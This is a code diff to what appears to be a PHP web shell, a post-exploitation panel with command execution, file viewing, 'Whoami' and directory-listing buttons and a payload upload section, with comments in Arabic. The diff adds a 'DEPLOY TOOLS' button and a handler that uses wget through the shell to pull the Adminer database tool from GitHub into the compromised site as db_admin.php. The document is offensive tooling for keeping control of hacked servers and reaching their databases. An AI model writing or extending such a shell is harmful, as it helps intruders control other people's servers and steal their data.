@@ -70,7 +70,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $f = $currentDirectory . '/' . $_POST['view_f'];
         if (file_exists($f)) $viewResult = $fg($f);
     }
-
+// التحقق من طلب نشر أداة إدارة قواعد البيانات
+if (isset($_POST['get_db_admin'])) {
+    // استخدام أمر wget عبر الشيل لتحميل الأداة وتسميتها db_admin.php
+    $cmd = "wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php -O db_admin.php 2>&1";
+    $viewResult = $sx($cmd);
+    
+    // التحقق من نجاح العملية
+    if (file_exists('db_admin.php')) {
+        $viewResult .= "\n[+] SUCCESS: Adminer deployed as db_admin.php";
+    } else {
+        $viewResult .= "\n[-] ERROR: Shell execution failed or wget not installed.";
+    }
+}
     // عرض الصور (بتحويلها لـ Base64)
     if (isset($_POST['view_i'])) {
         $imgFile = $currentDirectory . '/' . $_POST['view_i'];
@@ -163,6 +175,10 @@ ob_clean();
             <form method="post">
                 <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-user-secret"></i> Whoami</button>
                 <button name="cmd_input" value="ls -la" class="btn-side"><i class="fas fa-list"></i> Full Directory List</button>
+				<div class="side-tag">تجهيز الأدوات // DEPLOY TOOLS</div>
+    <button name="get_db_admin" value="1" class="btn-side" style="border-color: var(--gold); color: var(--gold);">
+        <i class="fas fa-file-download"></i> جلب أداة DB Admin (wget)
+    </button>
             </form>
 
             <div class="side-tag">Payload Upload</div>
@@ -269,6 +285,7 @@ ob_clean();
 </div>
 </body>
 </html>
+
 
 
 
